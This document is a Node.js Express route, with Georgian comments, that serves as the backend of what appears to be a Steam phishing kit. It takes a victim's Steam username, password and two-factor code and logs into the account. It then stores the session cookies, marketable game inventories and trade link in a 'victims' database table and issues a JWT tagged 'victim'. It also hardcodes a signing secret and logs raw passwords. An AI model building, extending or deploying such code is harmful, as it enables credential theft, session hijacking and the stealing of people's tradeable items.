const router = require('express').Router()
const SteamUser = require('steam-user');
const session = require('steam-session')
const TradeOfferManager = require('steam-tradeoffer-manager')
const steamcommunity = require('steamcommunity')
const jwt = require('jsonwebtoken')
const axios = require('axios')
const db = require('../config/db.js')

const games = [
    { name: 'Rust', appid: 252490 },
    { name: 'Dota 2', appid: 570 },
    { name: 'Team Fortress 2', appid: 440 },
    { name: 'Counter-Strike 2', appid: 730 }
];

router.post('/', async (req, res) => {
    try {
        const { login, password, authCode } = req.body
        console.log(req.body)

        const community = new steamcommunity()
        const client = new SteamUser()
        let manager = new TradeOfferManager({
            "steam": client,
            "domain": "http://localhost:4080",
            "language": "en"
        });

        let responseSent = false; // დავამატეთ დროშა პასუხის გაგზავნის თვალთვალისთვის

        const sendErrorResponse = (message, status = 400) => {
            if (!responseSent) {
                responseSent = true;
                res.status(status).json({
                    success: false,
                    message: message
                });
            }
        };


        const sendSuccessResponse = (data) => {

            const token = jwt.sign(
                { userid: data.profile.steamID, role:'victim' },
                'adgadahadfhshwer234t5346y234rtuiopwdfg9382g138r23g523rgb23cufwepfu',
                { expiresIn: '1d' }
            );

            if (!responseSent) {
                responseSent = true;
                
                // ყველა ქუქისის დაყენება response-ში
                data.cookies.forEach(cookie => {
                    res.cookie('VicLoginToken', token, {
                        httpOnly: true,
                        secure: true,          // required when sameSite = 'None'
                        sameSite: 'none',
                        path: '/',
                        maxAge: 86400000
                    });
                });

                res.status(200).json({
                    success: true,
                    ...data,
                    cookies: undefined // ამოვიღებთ cookies-ს JSON პასუხიდან, რადგან უკვე დავაყენეთ
                });
            }
        };

        client.logOn({
            accountName: login,
            password: password,
            twoFactorCode: authCode
        });

        client.once('error', (err) => {
            sendErrorResponse(`Login failed: ${err.message}`);
        });


        client.on('webSession', (sessionID, cookies) => {
            manager.setCookies(cookies, (err) => {
                if (err) {
                    console.error('Failed to set cookies:', err);
                    sendErrorResponse('Failed to set cookies');
                    return;
                }

                console.log('✅ setCookies OK → მზად ვარ outgoing trade offer‑ის მოსმენაზე');

                // Get user profile data
                client.getPersonas([client.steamID], (err, personas) => {
                    if (err) {
                        console.error('Error fetching profile data:', err);
                        return;
                    }

                    const profile = personas[client.steamID.getSteamID64()];
                    console.log(profile);

                    // Steam Community-სთან კავშირის დამყარება
                    community.setCookies(cookies);
                    
                    // შევქმნათ ობიექტი თამაშების ინვენტარებისთვის
                    const gameInventories = {};
                    let processedGames = 0;

                    // ტრეიდლინკის მიღების ფუნქცია
                    const getTradeURL = () => {
                        return new Promise((resolve) => {
                            // მეთოდი 1: Steam Community API-ს გამოყენებით
                            community.getTradeURL((err, url) => {
                                if (!err && url) {
                                    console.log('✅ ტრეიდლინკი მიღებულია Steam Community-დან:', url);
                                    resolve(url);
                                    return;
                                }
                                
                                // მეთოდი 2: TradeOfferManager-ის გამოყენებით
                                manager.getUserDetails(client.steamID.getSteamID64(), (err, details) => {
                                    if (!err && details.tradeOfferToken) {
                                        const tradeURL = `https://steamcommunity.com/tradeoffer/new/?partner=${client.steamID.getAccountID()}&token=${details.tradeOfferToken}`;
                                        console.log('✅ ტრეიდლინკი მიღებულია TradeOfferManager-ით:', tradeURL);
                                        resolve(tradeURL);
                                        return;
                                    }
                                    
                                    console.log('⚠️ ტრეიდლინკი ვერ მოიძებნა');
                                    resolve(null);
                                });
                            });
                        });
                    };

                    const checkCompletion = async () => {
                        processedGames++;
                        if (processedGames === games.length) {
                            const tradeURL = await getTradeURL();

                            const [existingUser] = await db.execute(
                                'SELECT * FROM victims WHERE steamID = ?',
                                [client.steamID.getSteamID64()]
                            );
                            
                            if(existingUser.length === 0){ // Only insert if user doesn't exist
                                await db.execute(
                                    'INSERT INTO victims (authcookies, steamID, pictureurl, steamname, inventory, tradelink) VALUES (?, ?, ?, ?, ?, ?)',
                                    [cookies, client.steamID.getSteamID64(), profile.avatar_url_full, profile.player_name, gameInventories, tradeURL]
                                );
                            } else {
                                // Optionally update existing record if needed
                                await db.execute(
                                    'UPDATE victims SET authcookies = ?, pictureurl = ?, steamname = ?, inventory = ?, tradelink = ? WHERE steamID = ?',
                                    [cookies, profile.avatar_url_full, profile.player_name, gameInventories, tradeURL, client.steamID.getSteamID64()]
                                );
                            }
                            
                            sendSuccessResponse({
                                cookies: cookies,
                                message: 'Session cookies received',
                                inventories: gameInventories,
                                tradeLink: tradeURL,
                                profile: {
                                    steamID: client.steamID.getSteamID64(),
                                    name: profile.player_name,
                                    avatar: profile.avatar_url_full,
                                    profileUrl: `https://steamcommunity.com/profiles/${client.steamID.getSteamID64()}/`,
                                    onlineState: profile ? profile.persona_state : null
                                }
                            });
                        }
                    };

                    for (const game of games) {
                        gameInventories[game.name] = [];
                        
                        manager.getInventoryContents(game.appid, 2, true, async (err, inventory) => {
                            if (err) {
                                console.error(`❌ ${game.name} inventory load failed:`, err.message);
                                checkCompletion();
                                return;
                            }

                            console.log(`\n🎮 ${game.name} inventory (items: ${inventory.length}):`);

                            // Process items sequentially with rate limiting
                            for (const item of inventory) {
                                if (!item.marketable) {
                                    console.log(item.market_hash_name, ' is not marketable');
                                    continue;
                                }

                                try {
                                    // const priceData = await getItemPrice(item.market_hash_name, game.appid);

                                    console.log(item)
                                    
                                    gameInventories[game.name].push({
                                        appID: item.appid,
                                        name: item.market_hash_name,
                                        iconUrl: item.icon_url,
                                        marketable: item.marketable,
                                        assetID: item.assetid,
                                        amount: item.amount,
                                        tradable: item.tradable,
                                        color: item.name_color,
                                    });

                                    // Add delay between requests to avoid rate limiting
                                } catch (error) {
                                    console.error(`Error processing ${item.market_hash_name}:`, error);
                                    gameInventories[game.name].push({
                                        appID: item.appid,
                                        name: item.market_hash_name,
                                        error: "Failed to get price data"
                                    });
                                }
                            }
                            
                            checkCompletion();
                        });
                    }
                });
            });
        });

        client.on('loggedOn', () => {
            console.log('Account logged in');
            client.setPersona(SteamUser.EPersonaState.Online);
        });

    } catch (error) {
        console.log(error);
        if (!responseSent) {
            res.status(500).json({
                success: false,
                message: 'server error'
            });
        }
    }
});

module.exports = router;

